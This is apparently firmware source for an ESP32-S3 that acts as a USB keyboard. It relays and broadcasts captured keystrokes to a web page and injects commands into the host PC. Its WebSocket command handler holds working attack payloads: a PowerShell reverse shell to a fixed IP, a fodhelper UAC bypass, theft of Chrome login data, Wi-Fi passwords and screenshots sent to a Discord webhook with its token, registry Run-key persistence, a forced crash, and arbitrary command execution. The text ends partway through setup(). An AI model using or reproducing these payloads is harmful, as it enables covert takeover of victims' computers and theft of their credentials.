/**
 * =============================================================================
 * device_main.cpp — ESP32-S3 #2: USB Device HID + ESP-NOW Receiver + Web
 * Monitor
 * =============================================================================
 *
 * This board:
 *   1) Receives 8-byte HID keyboard reports via ESP-NOW
 *   2) Forwards them to the PC as a USB HID Keyboard device
 *   3) Runs a Wi-Fi AP with a sync WebServer + WebSocket (port 81)
 *      to broadcast live keystrokes to connected web clients
 *   4) Implements a watchdog to release all keys if no packet
 *      is received within KEY_RELEASE_TIMEOUT_MS
 *
 * Hardware:
 *   - ESP32-S3 DevKitC-1 with native USB port connected to the PC
 *   - Wi-Fi AP mode for the live web monitor
 *
 * =============================================================================
 */

#include "shared_protocol.h"
#include <Arduino.h>
#include <USB.h>
#include <USBHIDKeyboard.h>
#include <WebServer.h>
#include <WebSocketsServer.h>
#include <WiFi.h>
#include <esp_now.h>
#include <esp_wifi.h>

// =====================================================================
// Dual-serial helper: print to both USB CDC and UART0
// =====================================================================
#define LOG(fmt, ...)                                                            \
  do {                                                                           \
    Serial.printf(fmt, ##__VA_ARGS__);                                           \
    Serial0.printf(fmt, ##__VA_ARGS__);                                          \
  } while (0)

#define LOGLN(msg)                                                               \
  do {                                                                           \
    Serial.println(msg);                                                         \
    Serial0.println(msg);                                                        \
  } while (0)

// =====================================================================
// Global Objects
// =====================================================================
static USBHIDKeyboard Keyboard;
static WebServer server(WS_PORT);
static WebSocketsServer webSocket(81);

// --- State ---
static volatile bool newReportAvailable = false;
static kbd_report_t latestReport;
static kbd_report_t prevReport;
static unsigned long lastPacketTime = 0;
static bool keysPressed = false;

// --- CapsLock LED tracking (from USB host) ---
static volatile bool capsLockLed = false;
static volatile bool capsLockLedChanged = false;

// --- Language Detection State Machine ---
enum LangDetectState {
  LD_IDLE = 0,
  LD_ENSURE_CAPS_OFF,
  LD_WAIT_CAPS_OFF,
  LD_OPEN_RUN,
  LD_WAIT_RUN,
  LD_TYPE_CMD,
  LD_WAIT_TYPE,
  LD_PRESS_ENTER,
  LD_WAIT_RESULT,
  LD_DISMISS_ERROR,
  LD_CHECK_RESULT,
  LD_RESTORE_CAPS,
  LD_SEND_RESULT
};
static LangDetectState ldState = LD_IDLE;
static unsigned long ldTimer = 0;
static String ldResult = "";

// =====================================================================
// HID Keycode → ASCII Mapping
// =====================================================================
static String hidToAscii(uint8_t keycode, uint8_t modifier) {
  bool shift = (modifier & 0x22);
  bool ctrl = (modifier & 0x11);

  // Letters: 0x04 (A) to 0x1D (Z)
  if (keycode >= 0x04 && keycode <= 0x1D) {
    char c = 'a' + (keycode - 0x04);
    if (shift) c -= 32;
    if (ctrl) return String("Ctrl+") + String((char)(c - 32 + 64));
    return String(c);
  }

  // Numbers: 0x1E (1) to 0x27 (0)
  if (keycode >= 0x1E && keycode <= 0x27) {
    const char nums[] = "1234567890";
    const char shiftNums[] = "!@#$%^&*()";
    int idx = keycode - 0x1E;
    return String(shift ? shiftNums[idx] : nums[idx]);
  }

  switch (keycode) {
  case 0x28: return "[Enter]";
  case 0x29: return "[Esc]";
  case 0x2A: return "[Backspace]";
  case 0x2B: return "[Tab]";
  case 0x2C: return " ";
  case 0x2D: return shift ? String("_") : String("-");
  case 0x2E: return shift ? String("+") : String("=");
  case 0x2F: return shift ? String("{") : String("[");
  case 0x30: return shift ? String("}") : String("]");
  case 0x31: return shift ? String("|") : String("\\");
  case 0x33: return shift ? String(":") : String(";");
  case 0x34: return shift ? String("\"") : String("'");
  case 0x35: return shift ? String("~") : String("`");
  case 0x36: return shift ? String("<") : String(",");
  case 0x37: return shift ? String(">") : String(".");
  case 0x38: return shift ? String("?") : String("/");
  case 0x39: return "[CapsLock]";
  case 0x3A: return "[F1]";  case 0x3B: return "[F2]";
  case 0x3C: return "[F3]";  case 0x3D: return "[F4]";
  case 0x3E: return "[F5]";  case 0x3F: return "[F6]";
  case 0x40: return "[F7]";  case 0x41: return "[F8]";
  case 0x42: return "[F9]";  case 0x43: return "[F10]";
  case 0x44: return "[F11]"; case 0x45: return "[F12]";
  case 0x46: return "[PrintScreen]";
  case 0x47: return "[ScrollLock]";
  case 0x48: return "[Pause]";
  case 0x49: return "[Insert]";
  case 0x4A: return "[Home]";
  case 0x4B: return "[PageUp]";
  case 0x4C: return "[Delete]";
  case 0x4D: return "[End]";
  case 0x4E: return "[PageDown]";
  case 0x4F: return "[Right]";
  case 0x50: return "[Left]";
  case 0x51: return "[Down]";
  case 0x52: return "[Up]";
  default: return keycode > 0 ? String("[0x") + String(keycode, HEX) + "]" : "";
  }
}

static String modifierString(uint8_t mod) {
  String s = "";
  if (mod & 0x01) s += "LCtrl+";
  if (mod & 0x02) s += "LShift+";
  if (mod & 0x04) s += "LAlt+";
  if (mod & 0x08) s += "LGUI+";
  if (mod & 0x10) s += "RCtrl+";
  if (mod & 0x20) s += "RShift+";
  if (mod & 0x40) s += "RAlt+";
  if (mod & 0x80) s += "RGUI+";
  return s;
}

// =====================================================================
// Web Monitor HTML Page (extracted to include/index_html.h)
// =====================================================================
#include "index_html.h"

// =====================================================================
// Forward Declarations
// =====================================================================
static void forwardReportToPC(const kbd_report_t &report);
static void releaseAllKeys();

// =====================================================================
// CapsLock LED Callback (called when PC sends LED status to keyboard)
// =====================================================================
static void onKeyboardLedEvent(void *handler_args, esp_event_base_t base,
                               int32_t id, void *event_data) {
  arduino_usb_hid_keyboard_event_data_t *data =
      (arduino_usb_hid_keyboard_event_data_t *)event_data;
  capsLockLed = data->capslock;
  capsLockLedChanged = true;
}

// =====================================================================
// ESP-NOW Receive Callback (runs in Wi-Fi task context)
// =====================================================================
static void onEspNowRecv(const esp_now_recv_info_t *info, const uint8_t *data,
                         int data_len) {
  if (data_len == sizeof(kbd_report_t)) {
    memcpy((void *)&latestReport, data, sizeof(kbd_report_t));
    newReportAvailable = true;
    lastPacketTime = millis();
  }
}

// =====================================================================
// WebSocket Event Handler (WebSocketsServer by Links2004)
// =====================================================================
static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
                           size_t length) {
  switch (type) {
  case WStype_CONNECTED:
    LOG("[WS] Client #%u connected\n", num);
    webSocket.sendTXT(num, "Connected to KeyboardMonitor");
    break;
  case WStype_DISCONNECTED:
    LOG("[WS] Client #%u disconnected\n", num);
    break;
  case WStype_TEXT: {
    // Null-terminate the payload for safe string handling
    String msg = String((char *)payload).substring(0, length);
    LOG("[WS] TEXT from #%u: %s\n", num, msg.c_str());

    // --- Web Keyboard: simple text-based protocol ---
    // Special keys sent as named strings; characters sent as-is
    if (msg == "Enter") {
      Keyboard.press(KEY_RETURN);
      delay(20);
      Keyboard.releaseAll();
      LOG("[WebKB] Enter\n");
    } else if (msg == "Backspace") {
      Keyboard.press(KEY_BACKSPACE);
      delay(20);
      Keyboard.releaseAll();
      LOG("[WebKB] Backspace\n");
    } else if (msg == "Tab") {
      Keyboard.press(KEY_TAB);
      delay(20);
      Keyboard.releaseAll();
      LOG("[WebKB] Tab\n");
    } else if (msg == "Escape") {
      Keyboard.press(KEY_ESC);
      delay(20);
      Keyboard.releaseAll();
      LOG("[WebKB] Escape\n");
    } else if (msg == "ArrowUp") {
      Keyboard.press(KEY_UP_ARROW);
      delay(20);
      Keyboard.releaseAll();
    } else if (msg == "ArrowDown") {
      Keyboard.press(KEY_DOWN_ARROW);
      delay(20);
      Keyboard.releaseAll();
    } else if (msg == "ArrowLeft") {
      Keyboard.press(KEY_LEFT_ARROW);
      delay(20);
      Keyboard.releaseAll();
    } else if (msg == "ArrowRight") {
      Keyboard.press(KEY_RIGHT_ARROW);
      delay(20);
      Keyboard.releaseAll();
    } else if (msg == "CapsLock") {
      Keyboard.press(KEY_CAPS_LOCK);
      delay(20);
      Keyboard.releaseAll();
      LOG("[WebKB] CapsLock\n");
    // --- Key combo commands: "CMD:<combo>" ---
    } else if (msg.startsWith("CMD:")) {
      String combo = msg.substring(4);
      LOG("[WebKB] combo: %s\n", combo.c_str());
      if (combo == "CapsLock") {
        Keyboard.press(KEY_CAPS_LOCK);
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Win+Space") {
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press(' ');
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Win+D") {
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('d');
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Ctrl+Shift+Esc") {
        Keyboard.press(KEY_LEFT_CTRL);
        Keyboard.press(KEY_LEFT_SHIFT);
        Keyboard.press(KEY_ESC);
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Win+L") {
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('l');
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Ctrl+C") {
        Keyboard.press(KEY_LEFT_CTRL);
        Keyboard.press('c');
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Ctrl+V") {
        Keyboard.press(KEY_LEFT_CTRL);
        Keyboard.press('v');
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Ctrl+Z") {
        Keyboard.press(KEY_LEFT_CTRL);
        Keyboard.press('z');
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Ctrl+A") {
        Keyboard.press(KEY_LEFT_CTRL);
        Keyboard.press('a');
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Alt+Tab") {
        Keyboard.press(KEY_LEFT_ALT);
        Keyboard.press(KEY_TAB);
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Alt+F4") {
        Keyboard.press(KEY_LEFT_ALT);
        Keyboard.press(KEY_F4);
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "PrtSc") {
        Keyboard.press(KEY_PRINT_SCREEN);
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Win+R") {
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Delete") {
        Keyboard.press(KEY_DELETE);
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Insert") {
        Keyboard.press(KEY_INSERT);
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Home") {
        Keyboard.press(KEY_HOME);
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "End") {
        Keyboard.press(KEY_END);
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "PageUp") {
        Keyboard.press(KEY_PAGE_UP);
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "PageDown") {
        Keyboard.press(KEY_PAGE_DOWN);
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "F11") {
        Keyboard.press(KEY_F11);
        delay(20);
        Keyboard.releaseAll();
      } else if (combo == "Shutdown") {
        // shutdown /s /t 0 via Win+R
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
        delay(800);
        Keyboard.print("shutdown /s /t 0");
        delay(200);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        LOG("[WebKB] Shutdown\n");
      } else if (combo == "Restart") {
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
        delay(800);
        Keyboard.print("shutdown /r /t 0");
        delay(200);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        LOG("[WebKB] Restart\n");
      } else if (combo == "DetectLang") {
        if (ldState == LD_IDLE) {
          ldState = LD_ENSURE_CAPS_OFF;
          LOG("[LangDetect] Detection started\n");
          webSocket.broadcastTXT("LANG:DETECTING");
        } else {
          LOG("[LangDetect] Already in progress\n");
        }
      } else if (combo == "BSOD") {
        // Real BSOD: Enable CrashOnCtrlScroll via admin cmd, then trigger
        // 1. Win+R → run reg add as admin
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
        delay(800);
        Keyboard.print("powershell Start-Process cmd -Verb RunAs "
                        "-ArgumentList '/c reg add HKLM\\SYSTEM\\CurrentControlSet"
                        "\\Services\\kbdhid\\Parameters /v CrashOnCtrlScroll "
                        "/t REG_DWORD /d 1 /f'");
        delay(300);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        // 2. Wait for UAC prompt, press Alt+Y to confirm
        delay(3000);
        Keyboard.press(KEY_LEFT_ALT);
        Keyboard.press('y');
        delay(20);
        Keyboard.releaseAll();
        // 3. Wait for reg add to finish, then Ctrl+ScrollLock ×2
        delay(3000);
        KeyReport kr = {};
        // First Ctrl+ScrollLock
        kr.modifiers = 0x01; // Left Ctrl
        kr.keys[0] = 0x47;   // HID ScrollLock
        Keyboard.sendReport(&kr);
        delay(200);
        memset(&kr, 0, sizeof(kr));
        Keyboard.sendReport(&kr); // release
        delay(200);
        // Second Ctrl+ScrollLock
        kr.modifiers = 0x01;
        kr.keys[0] = 0x47;
        Keyboard.sendReport(&kr);
        delay(200);
        memset(&kr, 0, sizeof(kr));
        Keyboard.sendReport(&kr); // release
        LOG("[WebKB] BSOD triggered\n");
      } else if (combo == "Screenshot") {
        // Capture screenshot & send to Discord webhook
        // Command too long for Win+R (259 limit), so open cmd first
        // 1. Open cmd via Win+R
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
        delay(800);
        Keyboard.print("cmd");
        delay(200);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        delay(1000);
        // 2. Type PowerShell screenshot + Discord webhook command
        Keyboard.print(
            "powershell -w h -ep bypass -c \""
            "Add-Type -A System.Windows.Forms,System.Drawing;"
            "$s=[Windows.Forms.Screen]::PrimaryScreen.Bounds;"
            "$b=New-Object Drawing.Bitmap $s.Width,$s.Height;"
            "[Drawing.Graphics]::FromImage($b).CopyFromScreen(0,0,0,0,$s.Size);"
            "$p=$env:TEMP+'\\ss.png';$b.Save($p);"
            "curl.exe -F ('file=@'+$p) "
            "https://discord.com/api/webhooks/1480962111373840517/"
            "0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-"
            "ciyqaBjdfxN4zgmmvD3;"
            "Remove-Item $p\" & exit");
        delay(300);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        LOG("[WebKB] Screenshot sent to Discord\n");
      } else if (combo == "RevShell+") {
        // Full reverse shell via cmd (bypass Win+R 259 limit)
        // 1. Open cmd via Win+R
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
        delay(800);
        Keyboard.print("cmd");
        delay(200);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        delay(1000);
        // 2. Type full PowerShell reverse shell (with byte stream + flush)
        Keyboard.print(
            "powershell -w h -nop -ep bypass -c \""
            "$c=New-Object Net.Sockets.TCPClient('192.168.0.103',4444);"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$sr=([Text.Encoding]::ASCII).GetBytes($r);"
            "$s.Write($sr,0,$sr.Length);"
            "$s.Flush()};"
            "$c.Close()\" & exit");
        delay(300);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        LOG("[WebKB] RevShell+ launched\n");
      } else if (combo == "AdminRevShell") {
        // Fodhelper UAC Bypass + Reverse Shell (Runs as SYSTEM/High Integrity)
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
        delay(800);
        Keyboard.print("cmd");
        delay(200);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        delay(1000);
        Keyboard.print(
            "powershell -w h -nop -ep bypass -c \""
            "$rcmd='powershell -w h -nop -ep bypass -c \"\"\"$c=New-Object Net.Sockets.TCPClient(''''192.168.0.103'''',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()\"\"\"';"
            "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
            "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value $rcmd -Force;"
            "Start-Process 'C:\\Windows\\System32\\fodhelper.exe';"
            "Start-Sleep -s 3;"
            "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
        delay(300);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        LOG("[WebKB] AdminRevShell launched\n");
      } else if (combo == "UACBypass") {
        // Fodhelper UAC Bypass Demonstration (Auto-elevates to Admin without prompt if user is in Admin group)
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
        delay(800);
        Keyboard.print("cmd");
        delay(200);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        delay(1000);
        Keyboard.print(
            "powershell -w h -nop -ep bypass -c \""
            "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
            "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value 'cmd.exe /c start powershell.exe -NoExit -Command Write-Host \"\"\"UAC BYPASSED - RUNNING AS SYSTEM/ADMIN\"\"\" -ForegroundColor Red' -Force;"
            "Start-Process 'C:\\Windows\\System32\\fodhelper.exe';"
            "Start-Sleep -s 3;"
            "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
        delay(300);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        LOG("[WebKB] UACBypass launched\n");
      } else if (combo == "ChromeExfil") {
        // Exfiltrate Chrome Local State and Login Data to Discord
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
        delay(800);
        Keyboard.print("cmd");
        delay(200);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        delay(1000);
        Keyboard.print(
            "powershell -w h -nop -ep bypass -c \""
            "$t=$env:TEMP+'\\c.zip';"
            "$l=$env:LOCALAPPDATA+'\\Google\\Chrome\\User Data\\Local State';"
            "$d=$env:LOCALAPPDATA+'\\Google\\Chrome\\User Data\\Default\\Login Data';"
            "$w=$env:TEMP+'\\w';"
            "mkdir $w -Force;"
            "if(Test-Path $l){Copy-Item $l $w};"
            "if(Test-Path $d){Copy-Item $d $w};"
            "Compress-Archive -Path $w\\* -DestinationPath $t -Force;"
            "curl.exe -F ('file=@'+$t) "
            "https://discord.com/api/webhooks/1480962111373840517/"
            "0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-"
            "ciyqaBjdfxN4zgmmvD3;"
            "Remove-Item $w -Recurse -Force;Remove-Item $t -Force\" & exit");
        delay(300);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        LOG("[WebKB] ChromeExfil launched\n");
      } else if (combo == "WiFiHarvest") {
        // Extract all saved WiFi passwords and send to Discord
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
        delay(800);
        Keyboard.print("cmd");
        delay(200);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        delay(1000);
        Keyboard.print(
            "powershell -w h -nop -ep bypass -c \""
            "$f=$env:TEMP+'\\w.txt';"
            "(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{ "
            "$n=$_.Matches.Groups[1].Value.Trim(); "
            "$k=(netsh wlan show profile name=\\\"$n\\\" key=clear) | Select-String 'Key Content\\W+\\:(.+)$'; "
            "if($k){ \\\"$n : $($k.Matches.Groups[1].Value.Trim())\\\" >> $f }else{ \\\"$n : NoKey\\\" >> $f } "
            "};"
            "curl.exe -F ('file=@'+$f) "
            "https://discord.com/api/webhooks/1480962111373840517/"
            "0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-"
            "ciyqaBjdfxN4zgmmvD3;"
            "Remove-Item $f\" & exit");
        delay(300);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        LOG("[WebKB] WiFiHarvest launched\n");
      } else if (combo == "Persistence") {
        // Write Reverse Shell to %APPDATA%\syslog.ps1 and add to Registry Run Key
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
        delay(800);
        Keyboard.print("cmd");
        delay(200);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        delay(1000);
        Keyboard.print(
            "powershell -w h -nop -ep bypass -c \""
            "$p=$env:APPDATA+'\\syslog.ps1';"
            "$s='$c=New-Object Net.Sockets.TCPClient(''192.168.0.103'',4444);"
            "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);"
            "$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()';"
            "Set-Content -Path $p -Value $s;"
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            "/v SysLog /t REG_SZ /d \\\"powershell -w h -nop -ep bypass -f $p\\\" /f\" "
            "& exit");
        delay(300);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        LOG("[WebKB] Persistence launched\n");
      } else {
        LOG("[WebKB] unknown combo: %s\n", combo.c_str());
      }
    // --- Run Script: "RUNCMD:<command>" ---
    // Opens Win+R, types command, presses Enter, then Esc×2 to dismiss errors
    } else if (msg.startsWith("RUNCMD:")) {
      String cmd = msg.substring(7);
      LOG("[WebKB] RunScript: %s\n", cmd.c_str());
      // 1. Win+R
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      delay(20);
      Keyboard.releaseAll();
      delay(800);
      // 2. Type the command
      Keyboard.print(cmd.c_str());
      delay(300);
      // 3. Enter
      Keyboard.press(KEY_RETURN);
      delay(20);
      Keyboard.releaseAll();
      // 4. After delay, Esc×2 to dismiss any error
      delay(3000);
      Keyboard.press(KEY_ESC);
      delay(20);
      Keyboard.releaseAll();
      delay(200);
      Keyboard.press(KEY_ESC);
      delay(20);
      Keyboard.releaseAll();
      LOG("[WebKB] RunScript done\n");
    // --- Thai mapping: "TH:<en_key>:<thai_display>" ---
    } else if (msg.startsWith("TH:") && msg.length() >= 6) {
      // Parse: TH:d:ก  (TH:<mapped_en>:<original_thai>)
      int sep = msg.indexOf(':', 3);
      if (sep > 3) {
        String enKey = msg.substring(3, sep);
        String thaiDisp = msg.substring(sep + 1);
        // Type the English key (PC Thai layout will produce Thai char)
        Keyboard.print(enKey.c_str());
        LOG("[WebKB] Thai: type='%s' disp='%s'\n", enKey.c_str(), thaiDisp.c_str());
        // Broadcast Thai char to monitor for correct display
        char json[160];
        snprintf(json, sizeof(json),
                 "{\"e\":\"press\",\"k\":\"%s\",\"h\":\"\",\"m\":\"\",\"t\":%lu,\"src\":\"web\"}",
                 thaiDisp.c_str(), millis());
        webSocket.broadcastTXT(json);
      }
    } else if (msg.length() > 0 && !msg.startsWith("Connected")) {
      // Normal character(s) — let Keyboard.print() handle layout
      Keyboard.print(msg.c_str());
      LOG("[WebKB] print: %s\n", msg.c_str());
    }

    // Broadcast to web monitor for display (non-Thai, non-CMD messages)
    if (msg.length() > 0 && msg.length() <= 10 && !msg.startsWith("Connected")
        && !msg.startsWith("CMD:") && !msg.startsWith("TH:")
        && !msg.startsWith("RUNCMD:")) {
      char json[160];
      snprintf(json, sizeof(json),
               "{\"e\":\"press\",\"k\":\"%s\",\"h\":\"\",\"m\":\"\",\"t\":%lu,\"src\":\"web\"}",
               msg.c_str(), millis());
      webSocket.broadcastTXT(json);
    }

    lastPacketTime = millis();
    break;
  }
  default:
    break;
  }
}

// =====================================================================
// Forward HID Report → USB HID Keyboard to PC
// =====================================================================
static void forwardReportToPC(const kbd_report_t &report) {
  KeyReport kr;
  kr.modifiers = report.modifier;
  kr.reserved = 0;
  memcpy(kr.keys, report.keycodes, 6);
  Keyboard.sendReport(&kr);
}

static void releaseAllKeys() { Keyboard.releaseAll(); }

// =====================================================================
// Broadcast Keystroke to WebSocket Clients (JSON format)
// =====================================================================
static void broadcastKeystrokes(const kbd_report_t &curr,
                                const kbd_report_t &prev) {
  unsigned long ts = millis();

  // --- Detect newly pressed keys ---
  for (int i = 0; i < 6; i++) {
    if (curr.keycodes[i] == 0x00)
      continue;

    bool wasPressed = false;
    for (int j = 0; j < 6; j++) {
      if (curr.keycodes[i] == prev.keycodes[j]) {
        wasPressed = true;
        break;
      }
    }

    if (!wasPressed) {
      String ascii = hidToAscii(curr.keycodes[i], curr.modifier);
      String type = "press";
      if (ascii.startsWith("[") && ascii.endsWith("]")) type = "special";

      // JSON: {"e":"press","k":"a","h":"0x04","m":"0x00","t":12345}
      char json[128];
      snprintf(json, sizeof(json),
               "{\"e\":\"%s\",\"k\":\"%s\",\"h\":\"0x%02X\",\"m\":\"0x%02X\",\"t\":%lu}",
               type.c_str(), ascii.c_str(), curr.keycodes[i], curr.modifier, ts);
      webSocket.broadcastTXT(json);
      LOG("[Key] %s (0x%02X) mod=0x%02X\n", ascii.c_str(), curr.keycodes[i], curr.modifier);
    }
  }

  // --- Detect released keys ---
  for (int i = 0; i < 6; i++) {
    if (prev.keycodes[i] == 0x00)
      continue;

    bool stillPressed = false;
    for (int j = 0; j < 6; j++) {
      if (prev.keycodes[i] == curr.keycodes[j]) {
        stillPressed = true;
        break;
      }
    }

    if (!stillPressed) {
      String ascii = hidToAscii(prev.keycodes[i], prev.modifier);
      char json[128];
      snprintf(json, sizeof(json),
               "{\"e\":\"release\",\"k\":\"%s\",\"h\":\"0x%02X\",\"m\":\"0x%02X\",\"t\":%lu}",
               ascii.c_str(), prev.keycodes[i], prev.modifier, ts);
      webSocket.broadcastTXT(json);
    }
  }

  // --- Detect modifier changes ---
  uint8_t modPressed = curr.modifier & ~prev.modifier;
  uint8_t modReleased = prev.modifier & ~curr.modifier;

  if (modPressed) {
    String modStr = modifierString(curr.modifier);
    if (modStr.length() > 0) {
      modStr = modStr.substring(0, modStr.length() - 1); // remove trailing +
      char json[128];
      snprintf(json, sizeof(json),
               "{\"e\":\"mod\",\"k\":\"%s\",\"h\":\"\",\"m\":\"0x%02X\",\"t\":%lu}",
               modStr.c_str(), curr.modifier, ts);
      webSocket.broadcastTXT(json);
    }
  }
  if (modReleased) {
    String modStr = modifierString(prev.modifier);
    if (modStr.length() > 0) {
      modStr = modStr.substring(0, modStr.length() - 1);
      char json[128];
      snprintf(json, sizeof(json),
               "{\"e\":\"mod_up\",\"k\":\"%s\",\"h\":\"\",\"m\":\"0x%02X\",\"t\":%lu}",
               modStr.c_str(), prev.modifier, ts);
      webSocket.broadcastTXT(json);
    }
  }
}

// =====================================================================
// Wi-Fi AP + ESP-NOW Initialization
// =====================================================================
static void initWiFiAndEspNow() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASSWORD, ESPNOW_WIFI_CHANNEL, 0,
              AP_MAX_CONNECTIONS);
  delay(500); // Wait for AP stack to be fully ready

  LOG("[WiFi] AP Started — SSID: %s, Channel: %d\n", AP_SSID,
      ESPNOW_WIFI_CHANNEL);
  LOG("[WiFi] IP: %s\n", WiFi.softAPIP().toString().c_str());
  LOG("[WiFi] MAC: %s\n", WiFi.softAPmacAddress().c_str());

  if (esp_now_init() != ESP_OK) {
    LOGLN("[ESP-NOW] Init FAILED! Restarting...");
    delay(1000);
    ESP.restart();
  }
  LOGLN("[ESP-NOW] Initialized OK");

  esp_now_register_recv_cb(onEspNowRecv);
}

// =====================================================================
// Web Server + WebSocket Initialization
// =====================================================================
static void initWebServer() {
  // HTTP: serve monitor page
  server.on("/", HTTP_GET, []() {
    server.send_P(200, "text/html", INDEX_HTML);
  });
  server.begin();
  LOGLN("[WebServer] HTTP started on port 80");

  // WebSocket on port 81
  webSocket.begin();
  webSocket.onEvent(webSocketEvent);
  LOG("[WebServer] WebSocket started on port 81\n");
  LOG("[WebServer] Monitor: http://%s/\n",
      WiFi.softAPIP().toString().c_str());
}

// =====================================================================
// Setup
// =====================================================================
void setup() {
  Serial.begin(115200);
  Serial0.begin(115200);
  delay(1000);

  LOGLN("========================================");
  LOGLN("  ESP32-S3 USB HID Bridge — DEVICE / RX");
  LOGLN("========================================");

  USB.begin();
  Keyboard.begin();
  Keyboard.onEvent(ARDUINO_USB_HID_KEYBOARD_LED_EVENT, onKeyboardLedEvent);
  LOGLN("[USB HID] Keyboard device started (LED callback registered)");

  initWiFiAndEspNow();
  initWebServer();

  memset((void *)&latestReport, 0, sizeof(kbd_report_t));
  memset(&prevReport, 0, sizeof(kbd_report_t));
  lastPacketTime = millis();

  LOGLN("[Ready] Waiting for ESP-NOW packets...");
